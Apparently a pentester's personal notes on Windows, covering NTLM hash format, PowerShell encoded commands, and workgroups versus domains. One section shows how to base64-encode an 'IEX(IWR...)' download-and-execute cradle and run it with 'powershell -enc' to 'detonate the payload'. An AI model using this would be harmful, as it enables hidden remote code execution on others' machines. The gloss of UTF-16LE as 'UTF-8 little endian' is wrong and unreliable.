# facts on windows
sort these as the field manual develops

## Hashing on windows
> NTLM hashes
```
LM:NTLM						; lan man : new technology lan manager
aad3...:31d6...				; blank hashes
```
> explanation of above
```
LM is no longer used but is often required for interacting with services; Anything can be put here!
```





## default windows encoding
> default encoding
```
UTF-16le 			; UTF-8 little endian

NECESSARY FOR POWERSHELL ENCODED COMMANDS
```

> necessary for PS encoded commands; detonating the payload
```sh
powershell -enc 'BASE64_ENCODED_COMMAND'
```

> encoding the payload
```sh
echo -n 'IEX(IWR....)' | iconv -t UTF-16LE | base64 -w 0

explanation:
	echo is the ps command we doing, new object, invoke-web, w.e.
	-t ; to code
	-w 0 ; all on 1 line
```




## Active Directory / Windows Policies

- default domain is 'WORKGROUP' or 'HOSTNAME'

> difference between WORKGROUP and DOMAIN
```
WORKGROUP is a LAN of peer to peer machines
	microsoft term for any network of peer2peer machines
	emphasis on PEER; no computer controls others
	each computer has its own user accounts
	all devices are part of same subnet
	limited to 10-20 devices
DOMAIN is a network of objects that share the same Active Directory Databases
	accounts are DOMAIN wide, any device part of domain will acknowledge the account (provided policy)
	there is a domain controler DC, acts as a server to control member objects of the AD
	devices can be on differing subnets but be part of same DOMAIN
	100-1000 devices
```

